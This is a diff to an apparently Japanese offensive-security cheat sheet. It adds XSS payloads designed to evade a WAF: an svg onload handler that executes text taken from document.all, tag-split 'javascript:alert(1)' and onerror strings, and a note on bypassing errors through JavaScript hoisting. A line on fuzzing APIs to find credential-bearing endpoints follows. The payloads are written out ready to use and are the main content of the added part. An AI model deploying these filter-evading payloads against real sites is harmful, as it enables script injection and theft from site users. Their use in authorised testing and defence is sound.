@@ -31,10 +31,20 @@ bタグで囲んだところを良いところで区切ってWAFバイパスを�
 ↓inner/outerHTML プロパティベースのペイロードには次のものがある  
 
 ```
+<svg onload=location=all[22].innerText>
+<b>javas<b></b>cript:al<b></b>ert(1)</b>
+```
+
+また、ブラウザ開発ツール(F12キー)でconsole.log(document.all)を使用して、nextSibling要素が22個目にあったとした場合↓
+```
 <svg onload=innerHTML=nextSibling.innerText>
 <b><img/src/on<b></b>error=al<b></b>ert(1)></b>
 ```
 
+#### JavaScriptのホイスティングを利用したXSS
+宣言されていないか存在しないオブジェクトへの参照により、JavaScript パーサーは ReferenceError をスローしてしまい、
+うまくXSSがささらない場合は、既存の関数を再度使用(ホイスティング)してバイパスすることができる  
+https://brutelogic.com.br/blog/xss-with-hoisting/
 
 ### API
 各フレームワークにあったエンドポイントリストを使ってファジング→ヒットしたURIにアクセスしてクレデンシャルなデータを保持しているAPIを見つける
